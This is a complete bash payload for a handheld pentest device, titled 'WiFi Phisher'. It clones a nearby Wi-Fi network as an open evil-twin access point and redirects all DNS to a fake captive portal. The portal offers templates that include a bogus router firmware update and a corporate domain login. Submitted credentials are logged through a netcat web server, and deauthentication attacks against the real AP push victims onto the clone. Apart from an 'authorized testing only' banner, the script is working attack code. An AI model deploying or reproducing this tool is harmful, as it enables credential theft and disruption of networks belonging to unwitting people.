#!/bin/bash
# Title: WiFi Phisher
# Author: bad-antics
# Description: Targeted WiFi phishing with custom captive portals and credential harvesting
# Category: nullsec/social-engineering

LOOT_DIR="/mmc/nullsec/phisher"
mkdir -p "$LOOT_DIR"

PROMPT "WIFI PHISHER

Targeted WiFi phishing with
custom captive portal deployment.

Features:
- Clone target AP appearance
- Custom login portal templates
- Credential harvest & logging
- DNS redirect to portal
- Auto SSL stripping
- Real-time credential alerts
- Multiple portal templates

FOR AUTHORIZED TESTING ONLY.

Press OK to configure."

# Monitor interface for scanning
MONITOR_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "No monitor interface!\nRun: airmon-ng start wlan1"; exit 1; }

# AP interface for hosting
AP_IF=$(TEXT_PICKER "AP interface:" "wlan0")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) AP_IF="wlan0" ;; esac

# Scan for target
resp=$(CONFIRMATION_DIALOG "SCAN FOR TARGET AP?

Scan nearby networks to clone.

Press OK to scan.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Scanning..."
SCAN_FILE="/tmp/phish_scan"
rm -f "${SCAN_FILE}"*.csv 2>/dev/null
timeout 15 airodump-ng "$MONITOR_IF" -w "$SCAN_FILE" --output-format csv 2>/dev/null
SPINNER_STOP

# Build target list
TARGET_COUNT=0
declare -a T_BSSID T_ESSID T_CH T_ENC

while IFS=',' read -r bssid first last channel speed privacy cipher auth power beacons iv lan_ip id_len essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    essid=$(echo "$essid" | sed 's/^ *//;s/ *$//')
    channel=$(echo "$channel" | tr -d ' ')
    privacy=$(echo "$privacy" | tr -d ' ')
    power=$(echo "$power" | tr -d ' ')

    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    [ -z "$essid" ] && continue
    [ -z "$power" ] || [ "$power" = "-1" ] && continue

    TARGET_COUNT=$((TARGET_COUNT + 1))
    T_BSSID[$TARGET_COUNT]="$bssid"
    T_ESSID[$TARGET_COUNT]="$essid"
    T_CH[$TARGET_COUNT]="$channel"
    T_ENC[$TARGET_COUNT]="$privacy"
done < "${SCAN_FILE}-01.csv" 2>/dev/null

[ $TARGET_COUNT -eq 0 ] && { ERROR_DIALOG "No networks found!"; exit 1; }

TARGET_NUM=$(NUMBER_PICKER "Target AP (1-$TARGET_COUNT):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac
[ $TARGET_NUM -lt 1 ] || [ $TARGET_NUM -gt $TARGET_COUNT ] && { ERROR_DIALOG "Invalid!"; exit 1; }

CLONE_BSSID="${T_BSSID[$TARGET_NUM]}"
CLONE_ESSID="${T_ESSID[$TARGET_NUM]}"
CLONE_CH="${T_CH[$TARGET_NUM]}"

# Portal template selection
TEMPLATE=$(NUMBER_PICKER "Portal template:
1=WiFi Login  2=Firmware Update
3=Terms of Service  4=Corporate
5=Hotel WiFi  6=Custom" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TEMPLATE=1 ;; esac

# Generate portal page based on template
PORTAL_DIR="/tmp/phish_portal"
mkdir -p "$PORTAL_DIR"

generate_portal() {
    local template="$1"
    local ssid="$2"

    case $template in
        1) # WiFi Login
            TITLE="WiFi Authentication"
            HEADING="Connect to $ssid"
            BODY="Please enter your credentials to access the wireless network."
            FIELDS='<input type="text" name="username" placeholder="Username or Email" required><br><br>
<input type="password" name="password" placeholder="Password" required>'
            ;;
        2) # Firmware Update
            TITLE="Router Firmware Update"
            HEADING="Firmware Update Required"
            BODY="Your router requires a firmware update. Please enter admin credentials to proceed."
            FIELDS='<input type="text" name="username" placeholder="Admin Username" value="admin" required><br><br>
<input type="password" name="password" placeholder="Admin Password" required>'
            ;;
        3) # Terms of Service
            TITLE="Terms of Service"
            HEADING="Accept Terms — $ssid"
            BODY="By using this network you agree to our terms. Please sign in with your email."
            FIELDS='<input type="email" name="email" placeholder="Email Address" required><br><br>
<input type="text" name="name" placeholder="Full Name" required>'
            ;;
        4) # Corporate
            TITLE="Corporate Network Access"
            HEADING="$ssid — Secure Login"
            BODY="This network requires domain authentication. Please enter your corporate credentials."
            FIELDS='<input type="text" name="domain" placeholder="DOMAIN" value="CORP" required><br><br>
<input type="text" name="username" placeholder="Username" required><br><br>
<input type="password" name="password" placeholder="Password" required>'
            ;;
        5) # Hotel
            TITLE="Guest WiFi Access"
            HEADING="Welcome to $ssid"
            BODY="Please enter your room number and last name to connect."
            FIELDS='<input type="text" name="room" placeholder="Room Number" required><br><br>
<input type="text" name="lastname" placeholder="Last Name" required><br><br>
<input type="text" name="email" placeholder="Email (optional)">'
            ;;
        *) # Custom
            TITLE="Network Login"
            HEADING="$ssid"
            BODY="Please authenticate to continue."
            FIELDS='<input type="text" name="username" placeholder="Username" required><br><br>
<input type="password" name="password" placeholder="Password" required>'
            ;;
    esac

    cat > "$PORTAL_DIR/index.html" << PORTAL_EOF
<!DOCTYPE html>
<html>
<head>
    <title>$TITLE</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
        body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f5;margin:0;padding:20px}
        .container{max-width:400px;margin:40px auto;background:#fff;border-radius:12px;padding:30px;box-shadow:0 2px 20px rgba(0,0,0,0.1)}
        h1{color:#333;font-size:22px;text-align:center;margin-bottom:5px}
        p{color:#666;text-align:center;font-size:14px;line-height:1.5}
        input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box;margin-top:5px}
        input:focus{border-color:#007AFF;outline:none}
        button{width:100%;padding:14px;background:#007AFF;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:15px}
        button:hover{background:#0056CC}
        .logo{text-align:center;margin-bottom:20px;font-size:40px}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📶</div>
        <h1>$HEADING</h1>
        <p>$BODY</p>
        <form method="POST" action="/login">
            $FIELDS
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
PORTAL_EOF
}

generate_portal "$TEMPLATE" "$CLONE_ESSID"

# Operation duration
DURATION=$(NUMBER_PICKER "Run time (minutes):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac

TIMESTAMP=$(date +%Y%m%d_%H%M)
CRED_LOG="$LOOT_DIR/creds_${CLONE_ESSID// /_}_${TIMESTAMP}.log"
REPORT="$LOOT_DIR/phish_report_${TIMESTAMP}.txt"

resp=$(CONFIRMATION_DIALOG "DEPLOY PHISHING AP?

Clone: $CLONE_ESSID
Channel: $CLONE_CH
Template: $TEMPLATE
Duration: ${DURATION} min
AP Interface: $AP_IF

AUTHORIZED TESTING ONLY.

Press OK to deploy.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Deploying phishing AP..."

echo "================================================================" > "$REPORT"
echo "         NULLSEC WIFI PHISHER REPORT                           " >> "$REPORT"
echo "================================================================" >> "$REPORT"
echo "Time: $(date)" >> "$REPORT"
echo "Target: $CLONE_ESSID ($CLONE_BSSID) Ch:$CLONE_CH" >> "$REPORT"
echo "Template: $TEMPLATE" >> "$REPORT"
echo "" >> "$REPORT"

LOG "Configuring AP..."

# Configure hostapd
cat > /tmp/phish_hostapd.conf << EOF
interface=$AP_IF
driver=nl80211
ssid=$CLONE_ESSID
hw_mode=g
channel=$CLONE_CH
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

# Configure dnsmasq for DHCP + DNS redirect
cat > /tmp/phish_dnsmasq.conf << EOF
interface=$AP_IF
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-facility=/tmp/phish_dns.log
address=/#/10.0.0.1
EOF

# Setup network
ip addr flush dev "$AP_IF" 2>/dev/null
ip addr add 10.0.0.1/24 dev "$AP_IF" 2>/dev/null
ip link set "$AP_IF" up 2>/dev/null

# Start services
killall hostapd dnsmasq 2>/dev/null
sleep 1
hostapd /tmp/phish_hostapd.conf -B 2>/dev/null
dnsmasq -C /tmp/phish_dnsmasq.conf 2>/dev/null &

# Start simple HTTP server with credential capture
LOG "Starting portal server..."

# Create CGI capture script
cat > "$PORTAL_DIR/capture.sh" << 'CAPTURE_EOF'
#!/bin/bash
read -r POST_DATA
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
CLIENT_IP="${REMOTE_ADDR:-unknown}"
# Decode URL encoding
DECODED=$(echo "$POST_DATA" | sed 's/+/ /g;s/%\([0-9A-Fa-f][0-9A-Fa-f]\)/\\x\1/g' | xargs -0 printf '%b' 2>/dev/null || echo "$POST_DATA")
echo "[$TIMESTAMP] $CLIENT_IP: $DECODED" >> /tmp/phish_creds.log
echo "HTTP/1.1 302 Found"
echo "Location: http://10.0.0.1/"
echo ""
CAPTURE_EOF
chmod +x "$PORTAL_DIR/capture.sh"

# Simple netcat-based HTTP server
TOTAL_CREDS=0
TOTAL_CONNECTIONS=0
END_TIME=$(($(date +%s) + DURATION * 60))

(
while [ $(date +%s) -lt $END_TIME ]; do
    {
        read -r REQUEST
        METHOD=$(echo "$REQUEST" | awk '{print $1}')
        PATH=$(echo "$REQUEST" | awk '{print $2}')

        # Read headers
        CONTENT_LENGTH=0
        while read -r header; do
            header=$(echo "$header" | tr -d '\r')
            [ -z "$header" ] && break
            case "$header" in
                Content-Length:*) CONTENT_LENGTH=$(echo "$header" | awk '{print $2}') ;;
            esac
        done

        if [ "$METHOD" = "POST" ]; then
            # Read POST body
            POST_BODY=""
            if [ "$CONTENT_LENGTH" -gt 0 ] 2>/dev/null; then
                read -r -n "$CONTENT_LENGTH" POST_BODY
            fi

            # Log credentials
            DECODED=$(echo "$POST_BODY" | sed 's/+/ /g;s/&/\n  /g')
            echo "[$(date '+%H:%M:%S')] CAPTURED:" >> "$CRED_LOG"
            echo "  $DECODED" >> "$CRED_LOG"
            echo "" >> "$CRED_LOG"

            # Redirect back
            echo -e "HTTP/1.1 302 Found\r\nLocation: /\r\nConnection: close\r\n\r\n"
        else
            # Serve portal page
            CONTENT=$(cat "$PORTAL_DIR/index.html")
            LEN=${#CONTENT}
            echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: $LEN\r\nConnection: close\r\n\r\n$CONTENT"
        fi
    } < /dev/stdin | nc -l -p 80 -q 1 2>/dev/null
done
) &
HTTP_PID=$!

# Also deauth original AP to force clients to our clone
if [ -n "$CLONE_BSSID" ]; then
    (
        while [ $(date +%s) -lt $END_TIME ]; do
            aireplay-ng -0 3 -a "$CLONE_BSSID" "$MONITOR_IF" > /dev/null 2>&1
            sleep 30
        done
    ) &
    DEAUTH_PID=$!
fi

# Monitor progress
LOG "Phishing AP active: $CLONE_ESSID"
SPINNER_STOP
SPINNER_START "Phishing active — capturing..."

LAST_CRED_COUNT=0
while [ $(date +%s) -lt $END_TIME ]; do
    sleep 10
    REMAINING=$(( (END_TIME - $(date +%s)) / 60 ))

    if [ -f "$CRED_LOG" ]; then
        CURRENT_CREDS=$(grep -c "CAPTURED" "$CRED_LOG" 2>/dev/null || echo 0)
        if [ "$CURRENT_CREDS" -gt "$LAST_CRED_COUNT" ]; then
            LOG "Credentials captured: $CURRENT_CREDS (${REMAINING}m remaining)"
            LAST_CRED_COUNT=$CURRENT_CREDS
        fi
    fi
done

# Cleanup
kill $HTTP_PID $DEAUTH_PID 2>/dev/null
killall hostapd dnsmasq nc aireplay-ng 2>/dev/null
ip addr flush dev "$AP_IF" 2>/dev/null

SPINNER_STOP

# Count results
CRED_COUNT=0
[ -f "$CRED_LOG" ] && CRED_COUNT=$(grep -c "CAPTURED" "$CRED_LOG" 2>/dev/null || echo 0)

# Finalize report
echo "--- RESULTS ---" >> "$REPORT"
echo "  Duration: ${DURATION} minutes" >> "$REPORT"
echo "  Credentials captured: $CRED_COUNT" >> "$REPORT"
if [ -f "$CRED_LOG" ]; then
    echo "" >> "$REPORT"
    echo "--- CAPTURED CREDENTIALS ---" >> "$REPORT"
    cat "$CRED_LOG" >> "$REPORT"
fi
echo "================================================================" >> "$REPORT"

PROMPT "PHISHING COMPLETE

Target: $CLONE_ESSID
Duration: ${DURATION} min
Credentials: $CRED_COUNT

$([ $CRED_COUNT -gt 0 ] && echo "Creds: $CRED_LOG")
Report: $REPORT"
